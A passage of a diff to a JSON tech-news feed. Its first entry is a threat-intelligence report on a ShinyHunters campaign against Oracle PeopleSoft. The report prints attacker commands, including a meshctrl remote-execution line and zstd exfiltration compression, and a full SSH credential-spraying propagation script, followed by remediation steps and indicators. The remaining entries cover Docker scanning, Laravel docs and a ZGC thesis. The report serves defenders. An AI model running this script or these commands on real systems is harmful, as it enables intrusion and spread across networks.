/etc/hosts | grep -E \"[redacted_victim_string]\".\nInspected WebLogic XML configurations (config.xml) to map internal application servers.\n3. Lateral Movement & Script Propagation:\nWrote the lateral propagation script [victim_abbreviation]_fanout.sh via a heredoc to /tmp on the staging host.\nTriggered the execution of the propagation script on compromised hosts using the MeshCentral command execution feature:\n\n\nnode meshctrl.js RunCommand --loginuser admin --loginpass '[password]' --id '[agent_id]' --run 'bash /tmp/[victim_abbreviation]_fanout.sh'\n\n\nVerified propagation success by running remote checks for the defacement marker file README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT.\n4. Exfiltration & DLS Connection:\nCompressed exfiltrated directories containing stolen data using zstd:\n\n\npv -s \"$(du -sb exfil | awk '{print $1}')\" | zstd -3 -T0 -o exfil.tar.zst\n\n\nConcluded operations by establishing an outbound SSH connection from the staging host to 176.120.22.24, the IP address hosting the public mirror of the ShinyHunters Data Leak Site.\n\n\n\n\n\n\n\n\n  \n    \nFigure 1: ShinyHunters DLS Post showing Peoplesoft victim added June 9, 2026\n\n      \n    \n\n  \n      \nPropagation Script & Lateral Movement\nAs observed in the .bash_history log, the threat actors wrote a propagation script named [victim_abbreviation]_fanout.sh directly to the /tmp directory of the compromised system. This script automates SSH credential spraying against internal hosts by parsing hostnames from the local /etc/hosts file matching a specific naming pattern. The script attempts authentication using a hardcoded list of common administrative and application-specific usernames and passwords.\nUpon establishing a successful SSH session, the script copies a defacement and extortion marker file named README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT into the WebLogic and Process Scheduler directories. This staging and deployment activity directly correlates with the publication of stolen archives on the ShinyHunters DLS on June 9, 2026.\nThe redacted contents of the propagation script [victim_abbreviation]_fanout.sh are as follows:\n\n\nset +e\r\nSRC=\"/u01/app/psoft/ps_config_homes/csprd/webserv/CSPRD02/README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT\"\r\nNAME=\"README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT\"\r\nBASE=\"/u01/app/psoft/ps_config_homes/csprd\"\r\nexport PATH=/usr/bin:/bin\r\n# hosts from /etc/hosts — internal PS nodes only\r\nHOSTS=$(grep -E '[redacted_victim_host_pattern]|csprd[0-9]' /etc/hosts | awk '{print $2}' | grep -v '^#' | sort -u)\r\necho \"HOSTS=$(echo $HOSTS | wc -w)\"\r\nPWDS=\"[redacted_passwords]\"\r\nUSERS=\"[redacted_usernames]\"\r\nOK=0; FAIL=0; SKIP=0\r\nfor h in $HOSTS; do\r\n  echo \"=== $h ===\"\r\n  copied=0\r\n  for u in $USERS; do\r\n    for p in $PWDS; do\r\n      sshpass -p \"$p\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=no $u@$h \"hostname\" >/dev/null 2>&1 && {\r\n        for dest in $BASE/webserv/CSPRD $BASE/webserv/CSPRD02 $BASE/appserv/prcs; do\r\n          sshpass -p \"$p\" ssh -o StrictHostKeyChecking=no $u@$h \"test -d $dest && mkdir -p $dest && cat > $dest/$NAME\" /dev/null && echo \"  OK $dest ($u)\" && OK=$((OK+1)) && copied=1\r\n        done\r\n        break 2\r\n      }\r\n    done\r\n  done\r\n  if [ $copied -eq 0 ]; then\r\n    # try key-based\r\n    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=yes $USER@$h \"hostname\" >/dev/null 2>&1 && copied=1 || true\r\n    if [ $copied -eq 0 ]; then echo \"  FAIL ssh\"; FAIL=$((FAIL+1)); fi\r\n  fi\r\ndone\r\n# local paths on this host\r\nfor dest in $BASE/webserv/CSPRD $BASE/webserv/CSPRD02 $BASE/appserv/prcs; do\r\n  if [ -d \"$dest\" ]; then cp -f \"$SRC\" \"$dest/$NAME\" && chmod 644 \"$dest/$NAME\" && echo \"LOCAL OK $dest\"; fi\r\ndone\r\necho SUMMARY ok=$OK fail=$FAIL\r\nfind $BASE -name \"$NAME\" -type f 2>/dev/null\n\n\nRemediation and Hardening\nTo defend against this campaign, we recommend that organizations running Oracle PeopleSoft immediately implement the following security measures:\nNetwork Isolation & WAF Rules\nEndpoint Access Restrictions: If you cannot disable the EMHub Service, immediately block external network access to the sensitive endpoints /PSEMHUB/* (specifically /PSEMHUB/hub) and /PSIGW/HttpListeningConnector at the network perimeter or firewall level. Relying solely on Web Application Firewall (WAF) body-inspection rules is insufficient, as these controls can be bypassed.\nNon-Breaking Action: Restricting these endpoints is considered non-breaking for standard end-user operations. The Environment Management Hub (EMHub) and the Integration Broker Listening Connector are administrative or system-to-system components and are not required for the core user-facing PeopleSoft Internet Architecture (PIA) browser sessions.\nLog & Endpoint Monitoring\nAccess Log Analysis: Audit the PIA WebLogic access logs for HTTP POST requests directed at /PSEMHUB/hub and /PSIGW/HttpListeningConnector originating from external or untrusted source IP addresses.\nSSRF Detection: Analyze requests to /PSIGW/HttpListeningConnector for loopback IP addresses (such as 127.0.0.1, localhost, or ::1) or internal IP ranges passed within request headers or parameters. This is a common method for attackers to perform Server-Side Request Forgery (SSRF) to bypass access controls.\nNetwork Telemetry\nOutbound Port 445 Monitoring: Monitor outbound firewall logs and NetFlow data for outbound SMB traffic (TCP port 445) originating from PeopleSoft hosts to untrusted, external internet destinations. The exploit chain may coerce the system into making outbound connections in an attempt to capture Windows machine-account NetNTLM hashes.\nHost-Level Auditing & Filesystem Checks\nConduct a thorough forensic audit of the web-tier filesystem on PeopleSoft hosts for indicators of compromise:\nWebshell Detection: Scan the WebLogic web application directory /webserv//applications/peoplesoft/PSEMHUB.war/ for any unexpected *.jsp files that are not part of the shipped product.\nUnauthorized Staging: Inspect the staging directory .../PSEMHUB.war/envmetadata/transactions/ for unauthorized folders, files, or binary drops.\nUnexpected Directories: Look for unexpected directories named logs, persistantstorage, or scratchpad under the PSEMHUB directories.\nXMLDecoder Persistence: Check /envmetadata/data/environment/ for recently created or modified .xml files, which may be leveraged by threat actors to execute remote code via XMLDecoder upon application restart.\nIn alignment with Oracle’s security advisory, we consider the implementation of these mitigations to be a high-priority risk reduction measure and strongly recommend immediate action to address the identified exposure. As this vulnerability is remotely exploitable without authentication and may result in remote code execution, organizations must remain on actively supported versions and apply all Critical Patch Updates, Critical Security Patch Updates, and Security Alerts without delay. Review the full Oracle Security Alert Advisory - CVE-2026-35273 for complete details.\nIndicators of Compromise (IOCs)\nTo assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI collection for registered users.\nStaging & C2 Network Indicators\n142.11.200.186\n142.11.200.187\n142.11.200.188\n142.11.200.189\n142.11.200.190\nazurenetfiles.net\nStaging Payloads & Attacker Files\n\n\n\n\n\n\nFile Path / Name\nIndicator Type\nDescription\nValue / Hash (SHA-256)\n.bash_history\nFile Hash\nAttacker command history\n2ab684d93c1553fad87041b4dea97188a97e78589deee2a7bacff905564f3a35\nmeshagent64-azure-ops.exe\nFile Hash\nPre-configured Windows agent\nf02a924c9ff92a8780ce812511341182c6b509d45bc59f3f7b522e37225d24fc\nmeshagent64-v2.exe\nFile Hash\nPre-configured Windows agent\nd83fdb9e53c5ff03c4cb0451ea1bebd79b53f29eadc1e2fa394c7af13a86ce2f\nmeshagent32-azure-ops.exe\nFile Hash\nPre-configured Windows agent\nc7e9332731b06644fc73e0046a2a89eaa59b09f54250e9bd622467187351711f\nmeshagent\nFile Hash\nUnconfigured Linux agent\n68257a6f9ff196179ec03624e849927f26599eb180a7c82e14ef5bc4e93bc309\nREADME-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT\nFilename\nDefacement / extortion marker\nN/A\n[victim_abbreviation]_fanout.sh\nFilename\nPropagation script\nN/A\n\n\n\n\n\n\n\n\n\n\nGoogle Security Operations (SecOps)\nSecOps customers will have access to the following pending-deployment rules. Once fully deployed, these rules will be available under the Mandiant Frontline Threats rule pack:\nOracle PeopleSoft Configuration Inspection\nOracle PeopleSoft Suspicious JSP File Write to PSEMHUB\nSshpass Interactive File Deployment\nData Archiving or Compression via Zstd Utility\nMeshCentral Command Execution via Meshctrl",
+    "url": "https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Mandiant "
+      ],
+      "title": [
+        ""
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Thu, 11 Jun 2026 14:00:00 +0000",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "GCP",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://www.docker.com/?p=91063",
+    "title": "Docker Hardened Images enhanced vulnerability scanning with Docker and Aikido",
+    "summary": "Aikido now scans Docker Hardened Images (DHI) with built-in VEX support. Vulnerabilities that Docker has verified as non-exploitable drop out of the queue automatically, so developers spend their time",
+    "aiSummary": "Aikido가 Docker Hardened Images에 대한 취약점 스캔 기능을 강화하며 VEX 지원을 새롭게 추가했습니다.\n\nDocker가 악용 가능성이 없다고 검증한 취약점들은 스캔 대기열에서 자동으로 제외됩니다. 이를 통해 개발자들은 불필요한 알림에 에너지를 쏟는 대신 실질적인 위협 요소 해결에 집중할 수 있게 되었습니다.\n\n이번 통합은 보안 점검 과정의 효율성을 크게 높여주며 개발 팀의 생산성을 개선하는 데 기여합니다. 사용자들은 Docker Hardened Images를 활용하여 보다 안전한 소프트웨어 공급망을 구축하고 취약점 관리 과정을 간소화할 수 있습니다.",
+    "cleanContent": "Aikido now scans Docker Hardened Images (DHI) with built-in VEX support. Vulnerabilities that Docker has verified as non-exploitable drop out of the queue automatically, so developers spend their time on findings that actually matter. This post walks through what changed, why it matters, and how users can benefit from the new integration. Why teams are...",
+    "url": "https://www.docker.com/blog/docker-hardened-images-enhanced-vulnerability-scanning-with-docker-and-aikido/",
+    "category": "클라우드 & 인프라",
+    "source": "Docker Blog",
+    "author": "Dan Berezin Stelzer",
+    "pubDate": "Thu, 11 Jun 2026 12:00:00 +0000",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Docker",
+      "Infra"
+    ]
+  },
+  {
+    "id": "https://laravel-news.com/version-controlled-documentation-inside-your-laravel-app-with-laradocs",
+    "title": "Version-Controlled Documentation Inside Your Laravel App with Laradocs",
+    "summary": "Laradocs turns markdown files committed alongside your code into a served documentation site at /docs, with folder-based navigation, front-matter metadata, and content reuse via variables and macros.\n",
+    "aiSummary": "Laradocs는 Laravel 애플리케이션 내부에 버전 관리된 문서 사이트를 구축할 수 있도록 지원하는 도구입니다. 이 서비스는 코드와 함께 커밋된 마크다운 파일을 기반으로 /docs 경로에 문서 사이트를 자동으로 생성합니다. 주요 기능으로는 폴더 기반의 탐색 구조 제공, 프런트메터 메타데이터 지원, 그리고 변수와 매크로를 활용한 콘텐츠 재사용 기능이 포함되어 있습니다. 이를 통해 개발자는 별도의 플랫폼을 이용하지 않고도 프로젝트 코드와 함께 체계적인 문서를 관리할 수 있습니다.",
+    "cleanContent": "Laradocs turns markdown files committed alongside your code into a served documentation site at /docs, with folder-based navigation, front-matter metadata, and content reuse via variables and macros.\nThe post Version-Controlled Documentation Inside Your Laravel App with Laradocs appeared first on Laravel News.\nJoin the Laravel Newsletter to get Laravel articles like this directly in your inbox.",
+    "url": "https://laravel-news.com/version-controlled-documentation-inside-your-laravel-app-with-laradocs?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
+    "category": "백엔드",
+    "source": "Laravel News",
+    "author": "Paul Redmond",
+    "pubDate": "Thu, 11 Jun 2026 05:38:46 +0000",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Laravel",
+      "PHP"
+    ]
+  },
+  {
     "id": "https://openai.com/index/using-codex-to-simulate-black-holes",
     "title": "How an astrophysicist uses Codex to help simulate black holes",
     "summary": "Discover how astrophysicist Chi-kwan Chan uses Codex to build black hole simulations, helping scientists study extreme physics and test Einstein’s theory of general relativity.",
@@ -45,6 +876,56 @@
       "OpenAI",
       "LLM",
       "AI"
+    ]
+  },
+  {
+    "id": "https://inside.java/2026/06/11/thesis-simplify-weak-reference-processing-zgc/",
+    "title": "Simplifying Weak Reference Processing in ZGC",
+    "summary": "My name is Fredrik, and I recently completed my master's degree in Computer and Information Engineering at Uppsala University. For my thesis I worked with the GC team at Oracle's Stockholm office, inv",
+    "aiSummary": "Uppsala University의 Fredrik이 수행한 연구는 ZGC에서 발생하는 WeakReference 처리 오버헤드를 줄이기 위한 최적화 기법을 다루고 있습니다. 기존 ZGC는 큐 등록 여부와 상관없이 모든 WeakReference를 동일하게 처리하여 대규모 워크로드에서 성능 병목 현상을 유발합니다. 이에 대한 해결책으로 크게 네 가지 메커니즘을 제안합니다.\n\n첫 번째는 Skip-Enqueue Separation으로, 큐 등록이 필요 없는 참조를 별도로 분리하여 ReferenceHandler 스레드 처리를 생략하는 방식입니다. 두 번째는 Dynamic Array를 도입하여 힙에 흩어진 객체 대신 연속적인 배열을 사용함으로써 캐시 지역성을 높이는 방법입니다. 세 번째는 Optimised Clear Path로, 참조 제거 과정에서 불필요한 로드 배리어, 가상 함수 호출, CAS 연산을 최적화하여 처리 속도를 대폭 개선합니다. 마지막으로 네 번째는 Weak Fields로, 객체 형태의 WeakReference 대신 @weak 어노테이션을 필드에 직접 적용하여 WeakReference 객체 자체를 제거하는 근본적인 접근 방식입니다.\n\n연구 결과, 세 가지 파이프라인 최적화를 조합한 clear_path_dyn 방식은 특정 단계에서 81%의 성능 향상을 보였으나 전체 GC 시간 단축에는 한계가 있었습니다. 반면 @weak 어노테이션을 사용하는 방식은 힙 점유율을 53% 줄이고 전체 주요 GC 시간을 최대 41%까지 단축하는 등 압도적인 효율성을 입증했습니다. 결과적으로 이번 연구는 WeakReference 오버헤드가 단순히 처리 파이프라인의 문제가 아니라 언어 차원에서의 표현 방식 문제임을 시사하며, @weak 어노테이션이 Java의 참조 관리 효율성을 높이는 유망한 대안이 될 수 있음을 보여줍니다.",
+    "cleanContent": "My name is Fredrik, and I recently completed my master's degree in Computer and Information Engineering at Uppsala University. For my thesis I worked with the GC team at Oracle's Stockholm office, investigating the overhead of weak reference processing in generational ZGC and whether it could be reduced with targeted modifications to the pipeline — or avoided altogether through a different representation of weak semantics.\n\t\t\t\tThe Problem\n\t\t\t\tJava's WeakReference provides a way to hold a reference to an object without preventing it from being collected. When the GC determines that an object is only weakly reachable, it clears the referent field and, if the reference was registered with a ReferenceQueue, enqueues the reference so the application can react to the collection event. This notification mechanism is optional: the WeakReference constructor accepts a null queue argument, and many uses, e.g. caches, interning maps, listener registrations, never register a queue.\n\t\t\t\tDespite this distinction, ZGC's reference-processing pipeline treats all weak references uniformly. Every discovered reference is linked into an intrusive per-thread linked list via the hidden discovered field, transferred to the ReferenceHandler thread via the pending list, and iterated by that thread regardless of whether it will actually be enqueued. This mismatch between the optional nature of the callback mechanism and the unconditional work performed for it has been noted in the OpenJDK issue tracker (JDK-8029205) but has not yet been addressed in the JDK.\n\t\t\t\tThe per-reference processing cost scales linearly with the number of weak references, making it a bottleneck in workloads that allocate many of them. This thesis investigates whether that cost can be reduced through three orthogonal pipeline modifications, and whether it can be avoided more fundamentally by replacing WeakReference objects with an annotated-field mechanism.\n\t\t\t\tFour Mechanisms\n\t\t\t\t1. Skip-Enqueue Separation (sep)\n\t\t\t\tThe simplest modification routes queue-less weak references to a separate per-worker discovered list during the mark phase. References on this list are processed and cleared by GC threads directly, without ever being added to the pending list or handed to the ReferenceHandler thread. The key change in ZReferenceProcessor is a queue check at discovery time:\n\t\t\t\tif (type == REF_WEAK && !has_reference_queue(ref)) {\n    weak_no_queue_list_per_worker.append(ref);  // bypasses pending list entirely\n} else {\n    discovered_list_per_worker.append(ref);     // normal enqueue pipeline\n}\n\n\t\t\t\t\n\t\t\t\tThe two lists are processed by specialised functions, keeping the no-enqueue path free of per-reference queue checks.\n\t\t\t\t2. Dynamic Array (dyn)\n\t\t\t\tThe intrusive linked list traversed during reference processing exhibits poor cache locality: each element is a WeakReference object scattered across the heap, and following the discovered chain requires loading a new cache line per reference. The dyn mechanism replaces this list with a contiguous ZWeakRefArray allocated on the C heap. References are appended during discovery in O(1) amortised time; during processing the array is iterated sequentially with index-based access, keeping references in L1/L2 cache. The array retains capacity between cycles to avoid reallocations when the reference population is stable.\n\t\t\t\tA secondary benefit is that field data can be pre-loaded during discovery and stored inline in each array entry, enabling the clear path optimisation described next.\n\t\t\t\t3. Optimised Clear Path (clear_path)\n\t\t\t\tThe standard ZGC path for clearing a referent performs three operations: a load barrier to read the referent, a virtual call to determine the reference type, and a CAS via a ZGC barrier to atomically set the field to a coloured null. For queue-less weak references, all three can be simplified:\n\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tLoad barrier eliminated. When combined with dyn, the referent address and value are pre-loaded at discovery time and stored in the array entry. No additional heap loads are needed at processing time.\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tVirtual call eliminated. The reference type is statically known at the call site.\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tCAS replaced with a plain store. The only concurrent application-level operations on a referent field are clearing or enqueueing it (both set it to null), so an atomic CAS can be replaced with a direct store without correctness risk.\n\t\t\t\t\t\n\t\t\t\t\n\t\t\t\tThese three simplifications interact constructively: individually they reduce non-strong processing time by 7% (clear_path_only) and 36% (dyn_only), but together in clear_path_dyn they achieve an 81% reduction — far larger than the sum of their individual contributions. The superadditivity arises because the dynamic array removes the pointer-chasing bottleneck that would otherwise persist when the CAS is eliminated, and the pre-loaded data lets the clear logic run without any barrier overhead.\n\t\t\t\t4. Weak Fields (weak_fields)\n\t\t\t\tThe three pipeline optimisations accelerate the processing of WeakReference's , but the WeakReference objects themselves remain on the heap and must be marked, promoted, and relocated across every GC cycle. The weak_fields mechanism takes a different approach: rather than wrapping a weak pointer in a separate object, weak semantics is expressed directly as a field annotation.\n\t\t\t\t// Instead of:\npublic class Cache {\n    private final WeakReference<Value> entry;\n}\n\n// With the @weak annotation:\npublic class Cache {\n    private @weak Value entry;\n}\n\t\t\t\t\n\t\t\t\tThe @weak annotation is recognised by the class-file parser and stored in fieldInfo metadata. At GC time, ZGC's marking closure checks each reference field against its fieldInfo entry and, if the field is annotated @weak, diverts it to a per-worker ZWeakFieldArray rather than treating it as a strong reference. After marking, weak fields whose referents are unreachable are nulled via a CAS.\n\t\t\t\tBenchmark Design\n\t\t\t\tTwo custom microbenchmarks target the reference-processing pipeline under ZGC:\n\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tSingle-object benchmark. 20 million holder objects each contain either a WeakReference or an @weak field pointing to a single shared target. After a randomised setup (Fisher-Yates shuffle), the strong reference to the target is released and System.gc() is called, concentrating the entire weak-reference load into one GC cycle and maximising non-strong processing time.\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tMulti-object benchmark. 2 million objects with variable-size byte-array payloads are paired with holder objects. Strong references are released in five 20%-rounds with a System.gc() after each round, spreading reference processing across multiple cycles.\n\t\t\t\t\t\n\t\t\t\t\n\t\t\t\tBoth benchmarks use -XX:+UseZGC, a 100 GB heap, and -XX:InitialTenuringThreshold=1 to promote objects quickly to the old generation where ZGC discovers and processes references. Each variant ran 250 measurement iterations on an exclusive AMD EPYC 9454P node (48 cores, 768 GiB RAM) on the UPPMAX Pelle supercomputer cluster, with four parallel instances pinned via taskset to isolated CPU sets to avoid inter-instance interference.\n\t\t\t\tResults\n\t\t\t\tNon-Strong Reference Processing Time\n\t\t\t\tThe metric most directly targeted by the optimisations is Concurrent Process Non-Strong, the wall-clock duration of ZGC's concurrent reference-processing phase.\n\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tVariant\n\t\t\t\t\t\t\tSingle-object median\n\t\t\t\t\t\t\tvs. baseline\n\t\t\t\t\t\t\tMulti-object median\n\t\t\t\t\t\t\tvs. baseline\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tnone (baseline)\n\t\t\t\t\t\t\t996.9 ms\n\t\t\t\t\t\t\t—\n\t\t\t\t\t\t\t44.1 ms\n\t\t\t\t\t\t\t—\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tsep_only\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t943.8 ms\n\t\t\t\t\t\t\t−5 %\n\t\t\t\t\t\t\t44.1 ms\n\t\t\t\t\t\t\t0 %\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tdyn_only\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t639.1 ms\n\t\t\t\t\t\t\t−36 %\n\t\t\t\t\t\t\t27.5 ms\n\t\t\t\t\t\t\t−38 %\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tclear_path_only\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t923.7 ms\n\t\t\t\t\t\t\t−7 %\n\t\t\t\t\t\t\t41.5 ms\n\t\t\t\t\t\t\t−6 %\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tclear_path_dyn\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t187.9 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−81 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t18.8 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−57 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tall\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t184.4 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−81 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t18.7 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−57 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tweak_fields\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t484.6 ms\n\t\t\t\t\t\t\t−51 %\n\t\t\t\t\t\t\t35.8 ms\n\t\t\t\t\t\t\t−19 %\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\n\t\t\t\tThe clear_path_dyn and all variants are the clear leaders. The sep_only variant shows that the enqueueing stage itself is not the dominant bottleneck: routing queue-less references away from the ReferenceHandler thread has negligible effect on processing time in these queue-less benchmarks. However, it should reduce pending-list traversal in the ReferenceHandler thread and might improve branch prediction in the processing step for workloads with a mix of queue-less and queue-registered references.\n\t\t\t\tTotal GC Collection Time\n\t\t\t\tThe 81% reduction in the targeted phase translates to a more modest improvement in total major collection time, because non-strong processing accounts for only 14.7% of baseline major-collection time in the single-object benchmark and 4.5% in the multi-object benchmark. Furthermore, these improvements should be taken with a grain of salt as the distributions of total collection time overlap substantially across variants, only the weak_fields variant shows a clear separation from the baseline.\n\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tVariant\n\t\t\t\t\t\t\tSingle-object median\n\t\t\t\t\t\t\tvs. baseline\n\t\t\t\t\t\t\tMulti-object median\n\t\t\t\t\t\t\tvs. baseline\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tnone\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t6 958 ms\n\t\t\t\t\t\t\t—\n\t\t\t\t\t\t\t982 ms\n\t\t\t\t\t\t\t—\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tall\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t6 377 ms\n\t\t\t\t\t\t\t−8 %\n\t\t\t\t\t\t\t967 ms\n\t\t\t\t\t\t\t−2 %\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tweak_fields\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t4 136 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−41 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t708 ms\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t−28 %\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\tweak_fields reduces major collection time by 41% and old-generation time by 37% in the single-object benchmark (28% and 31% in the multi-object benchmark). This improvement spans every phase - concurrent mark, relocate, young generation - because eliminating millions of WeakReference objects from the heap reduces the GC workload across the board, not only in the reference-processing phase.\n\t\t\t\tMemory Usage\n\t\t\t\tThe dynamic array incurs a meaningful auxiliary GCr memory cost in the single-object benchmark, where 20 million entries are live simultaneously:\n\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tVariant\n\t\t\t\t\t\t\tAuxiliary GCr memory (single-object, median max)\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tnone\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t120 MB\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tdyn_only\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t308 MB (+157%)\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tclear_path_dyn\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t1 268 MB (+957%)\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tall\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t884 MB (+637%)\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tweak_fields\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t446 MB (+272%)\n\t\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\n\t\t\t\tIn the multi-object benchmark the absolute numbers are smaller (292 MB baseline) and the relative overheads contract sharply, because the reference population is smaller.\n\t\t\t\t\n\t\t\t\t\tall saves ~30% of auxiliary GCr memory over clear_path_dyn by not needing to store the reference address in each array entry (the skip-enqueue separation routes queue-less references to a separate list, so the address field is not needed there) making it the more attractive pipeline variant overall.\n\t\t\t\tJava heap occupancy is essentially identical across all WeakReference variants (~1 720 MB in the single-object benchmark). weak_fields reduces this to 806 MB (−53%), directly reflecting the absence of the WeakReference objects.\n\t\t\t\tKey Takeaways\n\t\t\t\tThe results suggest that weak-reference overhead behaves more like a representation problem than a pipeline problem. Reducing it meaningfully appears to require reconsidering how weak semantics is encoded in the language, not merely how the resulting objects are processed once they have been allocated.\n\t\t\t\tThe clear_path_dyn and all combinations demonstrate that a carefully designed interaction between cache-friendly data structures and simplified per-reference logic can achieve large reductions in the targeted phase. Yet even an 81% reduction only an 8% reduction in collection time under conditions engineered to maximise it. The @weak field annotation, by contrast, eliminates the objects responsible for that overhead from every phase of every cycle, delivering 41% major-collection-time savings and 53% heap savings in the single-object benchmark.\n\t\t\t\tThis finding is consistent with how weak semantics is implemented across the broader language ecosystem. Go's weak.Pointer, C++'s std::weak_ptr, and .NET's WeakReference<T> all treat weak reachability and cleanup notification as separate concerns. The @weak annotation brings Java's callback-less weak-reference cost closer to that model.\n\t\t\t\tThe weak_fields implementation currently touches 27 files (compared to at most 10 for the most complex pipeline variant) and remains a prototype. Several paths forward are described in the thesis, including integration of one or more pipeline variants into the OpenJDK project.\n\t\t\t\t\n\t\t\t\tThe thesis is available at Uppsala University's DiVA portal. The full codebase is a fork of OpenJDK with all four mechanisms implemented as source-file overlays under patches/, together with build and benchmarking scripts. The complete measurement dataset is published on Zenodo.\n\t\t\t\tI would like to extend my sincere thanks to Stefan Johansson and Tobias Wrigstad for their guidance throughout the project, and to everyone at the Oracle Stockholm office for their support and generosity in sharing their expertise.",
+    "url": "https://inside.java/2026/06/11/thesis-simplify-weak-reference-processing-zgc/",
+    "category": "프로그래밍 언어",
+    "source": "Inside Java",
+    "author": "Fredrik Hammarberg (guest)",
+    "pubDate": "2026-06-11T00:00:00.000Z",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Java"
+    ]
+  },
+  {
+    "id": "https://spring.io/blog/2026/06/11/a-bootiful-podcast-rob-winch-answers-everything",
+    "title": "A Bootiful Podcast: Spring Security lead Rob Winch answers some security questions for me",
+    "summary": "Copyright © 2005 - 2026 Broadcom. All Rights Reserved. The term \"Broadcom\" refers to Broadcom Inc. and/or its subsidiaries. Terms of Use • Privacy • Trademark Guidelines Apache®, Apache Tomcat®, Apach",
